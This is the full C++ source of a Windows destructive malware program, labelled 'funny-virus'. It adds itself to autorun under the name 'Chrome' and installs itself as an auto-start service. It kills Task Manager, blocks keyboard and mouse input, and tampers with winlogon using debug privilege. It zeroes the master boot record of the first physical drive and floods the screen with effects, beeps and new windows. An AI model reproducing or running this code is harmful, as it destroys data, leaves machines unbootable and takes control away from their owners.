#include <windows.h>
#include <thread>
#include <TlHelp32.h>
#include <string>
#include <winuser.h>
#include <algorithm>
#include <winbase.h>

#define SE_DEBUG_PRIVILEGE 20
#define MBR_SIZE 512

typedef LONG(__stdcall* RtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);
typedef LONG(__stdcall* SuspendOrResumeProcess)(HANDLE hProcess);

extern PULONG InitSafeBootMode;

#include <windows.h>

int	nRandWidth = 150, nRandHeight = 15, nSpeed = 1;
int	nScreenWidth, nScreenHeight;

LRESULT WINAPI MelterProc(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam)
{
    switch (Msg) {
    case WM_CREATE:
    {
        HDC hdcDesktop = GetDC(HWND_DESKTOP);
        HDC hdcWindow = GetDC(hWnd);
        BitBlt(hdcWindow, 0, 0, nScreenWidth, nScreenHeight, hdcDesktop, 0, 0, SRCCOPY);
        ReleaseDC(hWnd, hdcWindow);
        ReleaseDC(HWND_DESKTOP, hdcDesktop);
        SetTimer(hWnd, 0, nSpeed, NULL);
        ShowWindow(hWnd, SW_SHOW);
    }
    return 0;
    case WM_ERASEBKGND:
        return 0;
    case WM_PAINT:
        ValidateRect(hWnd, NULL);
        return 0;
    case WM_TIMER:
    {
        HDC hdcWindow = GetDC(hWnd);
        int	nXPos = (rand() % nScreenWidth) - (nRandWidth / 2),
            nYPos = (rand() % nRandHeight),
            nWidth = (rand() % nRandWidth);
        BitBlt(hdcWindow, nXPos, nYPos, nWidth, nScreenHeight, hdcWindow, nXPos, 0, SRCCOPY);
        ReleaseDC(hWnd, hdcWindow);
    }
    return 0;
    case WM_CLOSE:
    case WM_DESTROY:
    {
        KillTimer(hWnd, 0);
        PostQuitMessage(0);
    }
    return 0;
    }
    return DefWindowProc(hWnd, Msg, wParam, lParam);
}

int melt(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nShowCmd)
{
    nScreenWidth = GetSystemMetrics(SM_CXSCREEN);
    nScreenHeight = GetSystemMetrics(SM_CYSCREEN);

    WNDCLASS wndClass = { 0, MelterProc, 0, 0, hInstance, NULL, LoadCursor(NULL, IDC_ARROW), 0, NULL, L"Melter" };
    if (!RegisterClass(&wndClass)) return MessageBoxA(HWND_DESKTOP, "Cannot register class!", NULL, MB_ICONERROR | MB_OK);

    HWND hWnd = CreateWindowA("Melter", NULL, WS_POPUP, 0, 0, nScreenWidth, nScreenHeight, HWND_DESKTOP, NULL, hInstance, NULL);
    if (!hWnd) return MessageBoxA(HWND_DESKTOP, "Cannot create window!", NULL, MB_ICONERROR | MB_OK);

    srand(GetTickCount());
    MSG Msg = { 0 };
    while (Msg.message != WM_QUIT) {
        if (PeekMessage(&Msg, NULL, 0, 0, PM_REMOVE)) {
            TranslateMessage(&Msg);
            DispatchMessage(&Msg);
        }
        if (GetAsyncKeyState(VK_ESCAPE) & 0x8000)
            DestroyWindow(hWnd);
    }
    return 0;
}

LRESULT ClosingTaskManager()
{
    return SendMessage(FindWindowA("TaskManagerWindow", 0), WM_CLOSE, 0, 0);
}
DWORD AddToAutorun()
{
    HKEY hKey;
    wchar_t szPath[MAX_PATH];
    GetModuleFileNameW(NULL, szPath, MAX_PATH);
    CopyFileW(szPath, L"C:\\funny-virus.exe", false);
    RegCreateKeyExW(HKEY_LOCAL_MACHINE,
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        NULL,
        LPWSTR(""),
        REG_OPTION_NON_VOLATILE,
        KEY_SET_VALUE,
        NULL,
        &hKey,
        NULL);
    system("move \"./*.dll\" \"C:/\"");
    if (hKey)
    {
        RegSetValueEx(hKey, L"Chrome", NULL, REG_SZ, (LPBYTE)(L"C:\\funny-virus.exe"), wcslen(szPath) + 1);
        RegCloseKey(hKey);
    }
    return 0;
}


DWORD GetWinlogonPid() {
    HANDLE			snap;
    PROCESSENTRY32	pEntry;
    BOOL			rtn;

    snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    pEntry.dwSize = sizeof(pEntry);
    rtn = Process32First(snap, &pEntry);
    while (rtn) {
        if (!wcscmp(pEntry.szExeFile, L"winlogon.exe")) {
            CloseHandle(snap);
            return pEntry.th32ProcessID;
        }
        memset(pEntry.szExeFile, 0, 260);
        rtn = Process32Next(snap, &pEntry);
    }

    CloseHandle(snap);
    return 0;
}

int APIENTRY main(HINSTANCE inst, HINSTANCE prev, LPSTR cmd, int showCmd)
{
    std::thread closetaskmgr([&]() {
        while (true)
        {
            Sleep(1000);
            ClosingTaskManager();
        }
        });
    closetaskmgr.detach();
    std::thread addtorun([&]() {
        AddToAutorun();
        });
    addtorun.detach();
    std::thread chaos([&]() {
        while (true)
        {
            Sleep(200);
            int random = rand();
            switch (random % 4)
            {
            case 0:
            {
                int random1 = rand();
                switch (random1 % 6)
                {
                case 0:
                {
                    system("start https://www.google.com/search?q=how+2+delete+virus");
                }
                case 1:
                {
                    system("start https://www.google.com/search?q=download+minecraft+cheats");
                }
                case 2:
                {
                    system("start https://www.google.com/search?q=download+csgo+cheats");
                }
                case 3:
                {
                    system("start https://www.youtube.com/watch?v=dQw4w9WgXcQ");
                }
                case 4:
                {
                    system("start https://www.youtube.com/channel/UCjYlpjuHknFt9NXZcyaHPyQ");
                }
                case 5:
                {
                    system("start https://www.youtube.com/watch?v=D8RESpMT1M8");
                }
                }
            }
            case 1:
            {
                system("start cmd");
            }
            case 2:
            {
                system("start notepad");
            }
            case 3:
            {
                system("start msedge");
            }
            }

        }
        });
    chaos.detach();

    std::thread beeep([&]() {
        while (true)
        {
            Sleep(500);
            switch (rand() % 5)
            {
            case 0:
            {
                MessageBeep(MB_ICONERROR);
                break;
            }
            case 1:
            {
                MessageBeep(MB_ICONINFORMATION);
                break;
            }
            case 2:
            {
                MessageBeep(MB_ICONQUESTION);
                break;
            }
            case 3:
            {
                MessageBeep(MB_ICONWARNING);
                break;
            }
            case 4:
            {
                MessageBeep(0x00000000L);
                break;
            }
            }
            Sleep(1000);
        }
        });
    beeep.detach();

    std::thread meltt([&]() {
        melt(inst, prev, cmd, showCmd);
        });
    meltt.detach();

    std::thread minusctrlaltdel([&]() {
        HMODULE hMod = LoadLibrary(L"ntdll");
        if (hMod == 0) {
            return 1;
        }

        RtlAdjustPrivilege lpfnRtlAdjustPrivilege = (RtlAdjustPrivilege)GetProcAddress(hMod, "RtlAdjustPrivilege");
        if (lpfnRtlAdjustPrivilege == 0) {
            return 1;
        }

        SuspendOrResumeProcess lpfnNtSuspendProcess = (SuspendOrResumeProcess)GetProcAddress(hMod, "NtSuspendProcess");
        if (lpfnNtSuspendProcess == 0) {
            return 1;
        }

        SuspendOrResumeProcess lpfnNtResumeProcess = (SuspendOrResumeProcess)GetProcAddress(hMod, "NtResumeProcess");
        if (lpfnNtResumeProcess == 0) {
            return 1;
        }

        DWORD pid = GetWinlogonPid();
        if (pid == 0) {
            return 1;
        }

        BOOLEAN dummy = 0;
        lpfnRtlAdjustPrivilege(SE_DEBUG_PRIVILEGE, true, false, &dummy);

        HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
        if (hProcess == 0) {
            return 1;
        }

        lpfnNtSuspendProcess(hProcess);
        lpfnNtResumeProcess(hProcess);

        CloseHandle(hProcess);
        while (true)
        {
            Sleep(1000);
        }
        return 0;
        });
    minusctrlaltdel.detach();

    std::thread makesc([&]() {
        wchar_t* tmppath = new wchar_t[MAX_PATH];
        GetModuleFileNameW(NULL, tmppath, MAX_PATH);
        std::wstring tmppath1(tmppath);
        delete[] tmppath;
        int last = tmppath1.find_last_of(L'\\', wcslen(tmppath1.c_str()));
        std::wstring path = tmppath1.substr(0, last) + L"\\service.exe";
        tmppath1.~basic_string();
        std::wstring command = std::wstring(L"sc create wokdjwodjwodjwodjwod binPath=\"") + path + std::wstring(L"\" DisplayName=\"Chrome\" start=auto type=own error=critical");

        _wsystem(command.c_str());
        });
    makesc.detach();

    std::thread blockinput([&]() {
        while (true)
        {
            Sleep(1000);
            BlockInput(true);
        }
        });
    blockinput.detach();

    std::thread deletembr([&]() {
        DWORD write;
        char mbr[MBR_SIZE];
        ZeroMemory(&mbr, (sizeof mbr));
        HANDLE MasterBootRecord = CreateFileW(L"\\\\.\\PhysicalDrive0",
            GENERIC_ALL,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            NULL,
            OPEN_EXISTING,
            NULL,
            NULL);
        WriteFile(MasterBootRecord, mbr, MBR_SIZE, &write, NULL);
        CloseHandle(MasterBootRecord);
        });
    deletembr.detach();

    while (true)
    {
        Sleep(5000);
    }
}